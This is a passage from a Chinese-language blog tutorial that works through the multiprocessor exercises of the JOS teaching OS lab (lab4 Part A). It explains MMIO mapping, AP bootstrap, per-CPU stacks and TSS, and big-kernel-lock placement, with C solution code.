class="hljs-string">&quot;lab3&quot;</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git checkout -b lab4 origin/lab4</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git merge lab3</span><br></code></pre></td></tr></table></figure><p>在 lab4 当中新增了如下文件：</p><table><thead><tr><th><code>kern/cpu.h</code></th><th>Kernel-private definitions for multiprocessor support</th></tr></thead><tbody><tr><td><code>kern/mpconfig.c</code></td><td>Code to read the multiprocessor configuration</td></tr><tr><td><code>kern/lapic.c</code></td><td>Kernel code driving the local APIC unit in each processor</td></tr><tr><td><code>kern/mpentry.S</code></td><td>Assembly-language entry code for non-boot CPUs</td></tr><tr><td><code>kern/spinlock.h</code></td><td>Kernel-private definitions for spin locks, including the big kernel lock</td></tr><tr><td><code>kern/spinlock.c</code></td><td>Kernel code implementing spin locks</td></tr><tr><td><code>kern/sched.c</code></td><td>Code skeleton of the scheduler that you are about to implement</td></tr></tbody></table><h2 id="Part-A-Multiprocessor-Support-and-Cooperative-Multitasking"><a href="#Part-A-Multiprocessor-Support-and-Cooperative-Multitasking" class="headerlink" title="Part A: Multiprocessor Support and Cooperative Multitasking"></a>Part A: Multiprocessor Support and Cooperative Multitasking</h2><p>在本 lab 的第一部分，我们将扩展 JOS 以让其能运行在一个多处理器系统上，并实现一些系统调用以允许用户级的进程创建新的进程；我们同时还将实现 <em>协作式的</em> 轮询调度（round-robin scheduling），允许内核在当前进程自愿放弃CPU 时进行进程调度；在 Part C 中我们还将实现 <em>抢占式</em> 的调度，其允许内核在一段时间后重新获取 CPU 的控制权</p><h3 id="Multiprocessor-Support"><a href="#Multiprocessor-Support" class="headerlink" title="Multiprocessor Support"></a>Multiprocessor Support</h3><p>我们将让 JOS 支持”对称式多处理“（symmetric multiprocessing）——一种所有 CPU 都有对系统资源同等的权限的多处理器模型。在引导过程中，SMP 中的 CPU 可以分为两种：由一个引导处理器（bootstrap processor，BSP）负责系统的初始化与启动工作，剩余的应用处理器（application processors，APs）则在系统运行之后再由 BSP 唤醒。而由哪个 CPU 来作为 BSP 则是由硬件与 BIOS 决定的。</p><p>在 SMP 系统中，每个 CPU 都附带有一个本地 APIC （LAPIC）单元，其不仅负责分发中断，还负责为其连接的 CPU 提供一个标识符，本次实验我们将利用 LAPIC 单元的下列基本功能（参见 <code>kern/lapic.c</code>）</p><ul><li>读取 LAPIC ID 以识别代码当前运行的 CPU（参见 <code>cpunum()</code>）</li><li>从 BSP 向 APs 发送 <code>STARTUP</code> 这一处理器间中断（interprocessor interrupt）以将其唤醒（参见 <code>lapic_startap()</code>）</li><li>在 part C 中，我们对 LAPIC 的内置计时器进行编程以触发时钟中断从而支持抢占式多任务（参见 <code>apic_init()</code>）</li></ul><blockquote><p><strong>Exercise 1.</strong> Implement <code>mmio_map_region</code> in <code>kern/pmap.c</code>. To see how this is used, look at the beginning of <code>lapic_init</code> in <code>kern/lapic.c</code>. You’ll have to do the next exercise, too, before the tests for <code>mmio_map_region</code> will run.</p></blockquote><p>处理器通过 MMIO 访问其 LAPIC：一部分物理内存被<strong>硬连线</strong>到部分 IO 设备的寄存器上，因此我们可以使用普通的存取指令来访问设备寄存器，相应地这块内存便是一个内存空洞。LAPIC 对应的内存空洞则在<strong>物理地址</strong> <code>0xFE000000</code> 处，占用 32 MB，我们无法通过基于 <code>KERNBASE</code> 的线性映射进行访问（超出 32 位地址了），但 JOS 在 <code>MMIOBASE</code> 处留了 4MB 的空白所以我们可以映射到此处</p><p>接下来是 Exercise 1，让我们实现 <code>mmio_map_region()</code></p><blockquote><p><strong>Exercise 1.</strong> Implement <code>mmio_map_region</code> in <code>kern/pmap.c</code>. To see how this is used, look at the beginning of <code>lapic_init</code> in <code>kern/lapic.c</code>. You’ll have to do the next exercise, too, before the tests for <code>mmio_map_region</code> will run.</p></blockquote><p>这个函数主要的作用就是将指定的物理内存映射到对应的虚拟内存上，只不过目标是 mmio 内存，直接使用我们之前写的 <code>boot_map_region()</code> 即可，以页为单位从 <code>MMIOBASE</code> 开始映射，若剩余的留给 MMIO 的区域不够则 panic，这里别忘了页表项标志位应设为 <code>PTE_W | PTE_PCD | PTE_PWT</code> （可写 &amp;&amp; 禁用高速缓存 &amp;&amp; 页级通写位）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Reserve size bytes in the MMIO region and map [pa,pa+size) at this</span><br><span class="hljs-comment">// location.  Return the base of the reserved region.  size does *not*</span><br><span class="hljs-comment">// have to be multiple of PGSIZE.</span><br><span class="hljs-comment">//</span><br><span class="hljs-type">void</span> *<br><span class="hljs-title function_">mmio_map_region</span><span class="hljs-params">(<span class="hljs-type">physaddr_t</span> pa, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br><span class="hljs-comment">// Where to start the next region.  Initially, this is the</span><br><span class="hljs-comment">// beginning of the MMIO region.  Because this is static, its</span><br><span class="hljs-comment">// value will be preserved between calls to mmio_map_region</span><br><span class="hljs-comment">// (just like nextfree in boot_alloc).</span><br><span class="hljs-type">static</span> <span class="hljs-type">uintptr_t</span> base = MMIOBASE;<br><br><span class="hljs-comment">// Reserve size bytes of virtual memory starting at base and</span><br><span class="hljs-comment">// map physical pages [pa,pa+size) to virtual addresses</span><br><span class="hljs-comment">// [base,base+size).  Since this is device memory and not</span><br><span class="hljs-comment">// regular DRAM, you&#x27;ll have to tell the CPU that it isn&#x27;t</span><br><span class="hljs-comment">// safe to cache access to this memory.  Luckily, the page</span><br><span class="hljs-comment">// tables provide bits for this purpose; simply create the</span><br><span class="hljs-comment">// mapping with PTE_PCD|PTE_PWT (cache-disable and</span><br><span class="hljs-comment">// write-through) in addition to PTE_W.  (If you&#x27;re interested</span><br><span class="hljs-comment">// in more details on this, see section 10.5 of IA32 volume</span><br><span class="hljs-comment">// 3A.)</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Be sure to round size up to a multiple of PGSIZE and to</span><br><span class="hljs-comment">// handle if this reservation would overflow MMIOLIM (it&#x27;s</span><br><span class="hljs-comment">// okay to simply panic if this happens).</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Hint: The staff solution uses boot_map_region.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Your code here:</span><br><br>size = ROUNDUP(pa + size, PGSIZE);<br>pa = ROUNDDOWN(pa, PGSIZE);<br>size -= pa;<br><span class="hljs-keyword">if</span> ((base + size) &gt; MMIOLIM || (base + size) &lt; MMIOBASE)<br>panic(<span class="hljs-string">&quot;Run out of MMIO region!&quot;</span>);<br><br>boot_map_region(kern_pgdir, base, size, pa, PTE_W | PTE_PCD | PTE_PWT);<br>base += size;<br><span class="hljs-keyword">return</span> (<span class="hljs-type">void</span>*)(base - size);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Application-Processor-Bootstrap"><a href="#Application-Processor-Bootstrap" class="headerlink" title="Application Processor Bootstrap"></a>Application Processor Bootstrap</h4><p>在启动 APs 之前 BSP 应当收集多处理器系统的相关信息，例如 CPU 总数、APIC IDs 以及 LAPIC 单元的 MMIO 地址，<code>mp_init()</code> 函数通过读取 BIOS 的内存区中的 MP 配置表来获取这些信息；在<code>boot_aps()</code> 中将 APs 启动（实模式），并将 AP 入口代码拷贝到一个实模式下可寻址的内存区域，不同于 bootloader，我们可以控制 APs 开始执行代码的位置，我们将入口代码复制到 0x7000 （<code>MPENTRY_PADDR</code>）处，不过其实任何 640KB 以下的未使用的页对齐的物理地址都可以被使用</p><p>之后 <code>boot_aps()</code> 通过向每一个 APs 的 LAPIC 单元发送 <code>STARTUP</code> IPI 以唤醒他们，其中包含有入口点的地址，在经过简单的设置之后 每个 AP 都将进入开启分页的保护模式，并调用 <code>mp_main()</code> 函数；<code>boot_aps()</code> 会等到每个被唤醒的 AP 在设置自己对应的 <code>struct CpuInfo</code> 中的 <code>cpu_status</code> 域的 <code>CPU_STARTED</code> 标志位后才会接着唤醒下一个</p><p>接下来是 Exercise 2，阅读启动过程的代码并修改 <code>page_init()</code> 以避免将 <code>MPENTRY_ADDR</code> 对应的页也链到 freelist 上</p><blockquote><p><strong>Exercise 2.</strong> Read <code>boot_aps()</code> and <code>mp_main()</code> in <code>kern/init.c</code>, and the assembly code in <code>kern/mpentry.S</code>. Make sure you understand the control flow transfer during the bootstrap of APs. Then modify your implementation of <code>page_init()</code> in <code>kern/pmap.c</code> to avoid adding the page at <code>MPENTRY_PADDR</code> to the free list, so that we can safely copy and run AP bootstrap code at that physical address. Your code should pass the updated <code>check_page_free_list()</code> test (but might fail the updated <code>check_kern_pgdir()</code> test, which we will fix soon).</p></blockquote><p>首先拜读一下 <code>boot_aps()</code>，逻辑还是比较简单的，主要就是拷贝启动代码到 0x7000，之后通过 <code>lapic_startap()</code> 唤醒单个 AP 并进行忙等待直到其设置自己的 <code>CPU_STARTED</code> 标志位，而 <code>mp_main()</code> 则主要是将内核页表装载到 AP 自己的 cr3 上，以及初始化自己的环境、IDT、从运行队列中取出进程（后面这些都需要我们在后续实现）</p><p>我们直接看修改 <code>page_init()</code>，如果在建 freelist 时对每一张内存页都进行一次判断那就太耗时了，笔者的选择是等到 freelist 建完之后再将对应页进行脱链</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">page_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">// LAB 4:</span><br><span class="hljs-comment">// Change your code to mark the physical page at MPENTRY_PADDR</span><br><span class="hljs-comment">// as in use</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">mpentry</span>, *<span class="hljs-title">mp_prev</span>;</span><br>    <br>    <span class="hljs-comment">//...</span><br>    <br>    <span class="hljs-comment">// 5) mark the physical page at MPENTRY_PADDR as in use</span><br>mpentry = pa2page(MPENTRY_PADDR);<br>mp_prev = pa2page(MPENTRY_PADDR + PGSIZE);<br>mp_prev-&gt;pp_link = mpentry-&gt;pp_link;<br>mpentry-&gt;pp_ref = <span class="hljs-number">1</span>;<br>mpentry-&gt;pp_link = <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来是习题：</p><blockquote><p><strong>Question</strong></p><ol><li>Compare <code>kern/mpentry.S</code> side by side with <code>boot/boot.S</code>. Bearing in mind that <code>kern/mpentry.S</code> is compiled and linked to run above <code>KERNBASE</code> just like everything else in the kernel, what is the purpose of macro <code>MPBOOTPHYS</code>? Why is it necessary in <code>kern/mpentry.S</code> but not in <code>boot/boot.S</code>? In other words, what could go wrong if it were omitted in <code>kern/mpentry.S</code>?<br>Hint: recall the differences between the link address and the load address that we have discussed in Lab 1.</li></ol></blockquote><p><code>MPBOOTPHYS</code> 宏主要的作用就是计算 entry code 中需要用到的地址的<strong>真实物理地址</strong>，因为 entry code 在被链接进内核二进制文件后其地址不一定是 0x7000 起始，但是我们将其加载到了该位置，因此对于绝对地址的索引需要计算其加载到该地址上之后的地址</p><h4 id="Per-CPU-State-and-Initialization"><a href="#Per-CPU-State-and-Initialization" class="headerlink" title="Per-CPU State and Initialization"></a>Per-CPU State and Initialization</h4><p>对于一个多处理器 OS 而言我们很有必要为每个 CPU 都分配一块私有空间（例如 Linux 中的 percpu 变量），我们可以分配一个数组并使用 <code>cpunum()</code> 获取到 CPU 标号作为下标索引，以下是我们应当注意的 per-CPU state：</p><ul><li><p><strong>Per-CPU kernel stack</strong>.</p><p>每个 CPU 都应当有属于其自己的堆栈，在 JOS 中数组 <code>percpu_kstacks[NCPU][KSTKSIZE]</code> 为每个 CPU 保留一份自己的堆栈区域；正如在 lab2 中我们将 BSP 的堆栈映射到了 KSTACKTOP 下，在本 lab 中我们将为每个 CPU 创建自己的堆栈，且应确保其堆栈占用一块连续的虚拟内存区域</p></li><li><p><strong>Per-CPU TSS and TSS descriptor</strong>.</p><p>我们同样需要一个 per-CPU 任务状态段来确定每个 CPU 的内核栈的位置，每个 CPU 的 TSS 被存放在 <code>cpus[i].cpu_ts</code> 中，对应的 TSS descriptor 则在 <code>gdt[(GD_TSS0) &gt;&gt; 3] + i]</code> ，定义于 <code>kern/trap.c</code> 中的全局变量 <code>ts</code> 则不再使用</p></li><li><p><strong>Per-CPU current environment pointer</strong>.</p><p>因为每个 CPU 都可以独立运行用户进程，因此我们将符号 <code>curenv</code> 重定义为 <code>cpus[cpunum()].cpu_env</code> ，指向运行在当前 CPU 上进程的 PCB</p></li><li><p><strong>Per-CPU system registers</strong>.</p><p>所有的寄存器对一个 CPU 而言都是私有的，因此我们还需要在每个 CPU 上都初始化其 cr3、gdt、idt…</p></li></ul><p>接下来是 Exercise 3，修改 <code>mem_init_mp()</code> 以为每个 CPU 分配一个内核栈</p><blockquote><p><strong>Exercise 3.</strong> Modify <code>mem_init_mp()</code> (in <code>kern/pmap.c</code>) to map per-CPU stacks starting at <code>KSTACKTOP</code>, as shown in <code>inc/memlayout.h</code>. The size of each stack is <code>KSTKSIZE</code> bytes plus <code>KSTKGAP</code> bytes of unmapped guard pages. Your code should pass the new check in <code>check_kern_pgdir()</code>.</p></blockquote><p>直接用 <code>boot_map_region</code> 创建映射即可，注意这里不管我们有多少个 CPU 都要建立 <code>NCPU</code> 个内核栈（这个时候 <code>ncpu</code> 变量还没初始化，而且整个 <code>percpu_kstack</code> 数组的大小是在编译期确定的）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Modify mappings in kern_pgdir to support SMP</span><br><span class="hljs-comment">//   - Map the per-CPU stacks in the region [KSTACKTOP-PTSIZE, KSTACKTOP)</span><br><span class="hljs-comment">//</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">mem_init_mp</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">// Map per-CPU stacks starting at KSTACKTOP, for up to &#x27;NCPU&#x27; CPUs.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// For CPU i, use the physical memory that &#x27;percpu_kstacks[i]&#x27; refers</span><br><span class="hljs-comment">// to as its kernel stack. CPU i&#x27;s kernel stack grows down from virtual</span><br><span class="hljs-comment">// address kstacktop_i = KSTACKTOP - i * (KSTKSIZE + KSTKGAP), and is</span><br><span class="hljs-comment">// divided into two pieces, just like the single stack you set up in</span><br><span class="hljs-comment">// mem_init:</span><br><span class="hljs-comment">//     * [kstacktop_i - KSTKSIZE, kstacktop_i)</span><br><span class="hljs-comment">//          -- backed by physical memory</span><br><span class="hljs-comment">//     * [kstacktop_i - (KSTKSIZE + KSTKGAP), kstacktop_i - KSTKSIZE)</span><br><span class="hljs-comment">//          -- not backed; so if the kernel overflows its stack,</span><br><span class="hljs-comment">//             it will fault rather than overwrite another CPU&#x27;s stack.</span><br><span class="hljs-comment">//             Known as a &quot;guard page&quot;.</span><br><span class="hljs-comment">//     Permissions: kernel RW, user NONE</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// LAB 4: Your code here:</span><br><span class="hljs-type">int</span> i;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; NCPU; i++)<br>&#123;<br>boot_map_region(kern_pgdir, <br>KSTACKTOP - i * (KSTKSIZE + KSTKGAP) - KSTKSIZE, <br>KSTKSIZE, <br>PADDR(&amp;percpu_kstacks[i]), <br>PTE_W);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来是 Exercise 4，更改 <code>trap_init_percpu()</code> 以让其能正常在所有 CPU 上运行</p><blockquote><p><strong>Exercise 4.</strong> The code in <code>trap_init_percpu()</code> (<code>kern/trap.c</code>) initializes the TSS and TSS descriptor for the BSP. It worked in Lab 3, but is incorrect when running on other CPUs. Change the code so that it can work on all CPUs. (Note: your new code should not use the global <code>ts</code> variable any more.)</p></blockquote><p>主要就是把全局变量 <code>ts</code> 替换成 <code>thiscpu</code> 指向的 <code>CpuInfo</code> 结构体的 <code>cpu_ts</code> 成员即可，以及修改全局段描述符表中对应段描述符为 tss 描述符时注意使用 <code>cpunum()</code> 来获取当前 CPU 的标号，还有就是注意将 tss 的 esp 初始化为对应 cpu 的栈，这里还要注意一点就是 <code>ltr</code> 指令所用的值应为 <em>对应的描述符在全局描述符表中的偏移</em> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Initialize and load the per-CPU TSS and IDT</span><br><span class="hljs-type">void</span><br><span class="hljs-title function_">trap_init_percpu</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">// The example code here sets up the Task State Segment (TSS) and</span><br><span class="hljs-comment">// the TSS descriptor for CPU 0. But it is incorrect if we are</span><br><span class="hljs-comment">// running on other CPUs because each CPU has its own kernel stack.</span><br><span class="hljs-comment">// Fix the code so that it works for all CPUs.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Hints:</span><br><span class="hljs-comment">//   - The macro &quot;thiscpu&quot; always refers to the current CPU&#x27;s</span><br><span class="hljs-comment">//     struct CpuInfo;</span><br><span class="hljs-comment">//   - The ID of the current CPU is given by cpunum() or</span><br><span class="hljs-comment">//     thiscpu-&gt;cpu_id;</span><br><span class="hljs-comment">//   - Use &quot;thiscpu-&gt;cpu_ts&quot; as the TSS for the current CPU,</span><br><span class="hljs-comment">//     rather than the global &quot;ts&quot; variable;</span><br><span class="hljs-comment">//   - Use gdt[(GD_TSS0 &gt;&gt; 3) + i] for CPU i&#x27;s TSS descriptor;</span><br><span class="hljs-comment">//   - You mapped the per-CPU kernel stacks in mem_init_mp()</span><br><span class="hljs-comment">//   - Initialize cpu_ts.ts_iomb to prevent unauthorized environments</span><br><span class="hljs-comment">//     from doing IO (0 is not the correct value!)</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// ltr sets a &#x27;busy&#x27; flag in the TSS selector, so if you</span><br><span class="hljs-comment">// accidentally load the same TSS on more than one CPU, you&#x27;ll</span><br><span class="hljs-comment">// get a triple fault.  If you set up an individual CPU&#x27;s TSS</span><br><span class="hljs-comment">// wrong, you may not get a fault until you try to return from</span><br><span class="hljs-comment">// user space on that CPU.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// LAB 4: Your code here:</span><br><br><span class="hljs-comment">// Setup a TSS so that we get the right stack</span><br><span class="hljs-comment">// when we trap to the kernel.</span><br>thiscpu-&gt;cpu_ts.ts_esp0 = KSTACKTOP - (KSTKSIZE + KSTKGAP) * cpunum();<br>thiscpu-&gt;cpu_ts.ts_ss0 = GD_KD;<br>thiscpu-&gt;cpu_ts.ts_iomb = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Taskstate);<br><br><span class="hljs-comment">// Initialize the TSS slot of the gdt.</span><br>gdt[(GD_TSS0 &gt;&gt; <span class="hljs-number">3</span>) + cpunum()] = SEG16(STS_T32A, (<span class="hljs-type">uint32_t</span>) (&amp;thiscpu-&gt;cpu_ts),<br><span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Taskstate) - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>gdt[(GD_TSS0 &gt;&gt; <span class="hljs-number">3</span>) + cpunum()].sd_s = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">// Load the TSS selector (like other segment selectors, the</span><br><span class="hljs-comment">// bottom three bits are special; we leave them 0)</span><br>ltr(GD_TSS0 + (cpunum() * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Segdesc)));<br><br><span class="hljs-comment">// Load the IDT</span><br>lidt(&amp;idt_pd);<br>&#125;<br></code></pre></td></tr></table></figure><p>运行 <code>make qemu CPUS=4</code>，可以看到我们的几个处理器都成功地启动了：</p><p><img src="https://s2.loli.net/2022/03/21/VvEiuky4DseIRTq.png" alt="image.png"></p><h4 id="Locking"><a href="#Locking" class="headerlink" title="Locking"></a>Locking</h4><p>伴随着多处理器系统的出现， <em>条件竞争</em> （race condition）成为了我们不得不考虑的一个问题，因此我们需要使用 <code>锁</code> 来保护临界区中的数据，在同一时间段只有一个 CPU 可以改变临界区内的数据，比较朴素的一个办法就是使用一个全局的 <em>big kernel lock</em> ，当用户进程进入内核态时上锁，退出后再解锁，这样在同一时刻只有一个用户进程可以运行在内核态，确保了内核数据的安全</p><p>在 <code>kern/spinlock.h</code> 中定义了一个大的内核锁 <code>kernel_lock</code>，同时提供了加锁与解锁的函数 <code>lock_kernel()</code> 和 <code>unlock_kernel()</code>，我们应当在以下四个地方使用大内核锁：</p><ul><li>在 BSP 唤醒 APs 前请求锁（<code>i386_init()</code>）</li><li>在初始化当前 AP 后请求锁（<code>mp_main()</code>），之后调用 <code>sched_yield()</code> 以在该 AP 上运行用户进程</li><li>在从用户态陷入内核态时请求锁（<code>trap()</code>），为了确定陷阱发生在用户态还是内核态，我们应当检查 <code>tf_cs</code> 的 RPL</li><li>在从内核态切换到用户态之前释放锁（<code>env_run()</code>），不要过早或过晚，否则可能会造成竞态或死锁</li></ul><p>于是接下来就是 Exercise 5：在上述位置补充相应的锁</p><blockquote><p><strong>Exercise 5.</strong> Apply the big kernel lock as described above, by calling <code>lock_kernel()</code> and <code>unlock_kernel()</code> at the proper locations.</p></blockquote><p>在 JOS 中，一个自旋锁起其实被定义为一个普通的整型变量，<strong>但是上锁与解锁的操作是通过原子指令完成的</strong>，而原子指令的实现<strong>其实是通过 <code>lock</code> 前缀完成的</strong>，被该前缀修饰的指令在访问内存时同时会完成对总线的控制，直到指令结束，从而<strong>从硬件层面保证了指令的原子性</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">uint32_t</span><br><span class="hljs-title function_">xchg</span><span class="hljs-params">(<span class="hljs-keyword">volatile</span> <span class="hljs-type">uint32_t</span> *addr, <span class="hljs-type">uint32_t</span> newval)</span><br>&#123;<br><span class="hljs-type">uint32_t</span> result;<br><br><span class="hljs-comment">// The + in &quot;+m&quot; denotes a read-modify-write operand.</span><br><span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot;lock; xchgl %0, %1&quot;</span></span><br><span class="hljs-params">     : <span class="hljs-string">&quot;+m&quot;</span> (*addr), <span class="hljs-string">&quot;=a&quot;</span> (result)</span><br><span class="hljs-params">     : <span class="hljs-string">&quot;1&quot;</span> (newval)</span><br><span class="hljs-params">     : <span class="hljs-string">&quot;cc&quot;</span>)</span>;<br><span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>现在你知道一个自旋锁该怎么实现了吧 ；）那么互斥锁呢？互斥锁的实现其实需要依赖额外的辅助结构…</p></blockquote><p>这里 <code>lock_kernel()</code> 和 <code>unlock_kernel()</code>直接操作的就是大内核锁，所以我们直接将其放置在对应位置即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">i386_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">// ...</span><br><br><span class="hljs-comment">// Acquire the big kernel lock before waking up APs</span><br><span class="hljs-comment">// Your code here:</span><br>lock_kernel();<br>    <br>    <span class="hljs-comment">// ...</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Setup code for APs</span><br><span class="hljs-type">void</span><br><span class="hljs-title function_">mp_main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">// We are in high EIP now, safe to switch to kern_pgdir </span><br>lcr3(PADDR(kern_pgdir));<br>cprintf(<span class="hljs-string">&quot;SMP: CPU %d starting\n&quot;</span>, cpunum());<br><br>lapic_init();<br>env_init_percpu();<br>trap_init_percpu();<br>xchg(&amp;thiscpu-&gt;cpu_status, CPU_STARTED); <span class="hljs-comment">// tell boot_aps() we&#x27;re up</span><br><br><span class="hljs-comment">// Now that we have finished some basic setup, call sched_yield()</span><br><span class="hljs-comment">// to start running processes on this CPU.  But make sure that</span><br><span class="hljs-comment">// only one CPU can enter the scheduler at a time!</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Your code here:</span><br>lock_kernel();<br>    sched_yield();<br><br><span class="hljs-comment">// Remove this after you finish Exercise 6</span><br><span class="hljs-keyword">for</span> (;;);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">trap</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Trapframe *tf)</span><br>&#123;<br><span class="hljs-comment">// ...</span><br><br><span class="hljs-keyword">if</span> ((tf-&gt;tf_cs &amp; <span class="hljs-number">3</span>) == <span class="hljs-number">3</span>) &#123;<br><span class="hljs-comment">// Trapped from user mode.</span><br><span class="hljs-comment">// Acquire the big kernel lock before doing any</span><br><span class="hljs-comment">// serious kernel work.</span><br><span class="hljs-comment">// LAB 4: Your code 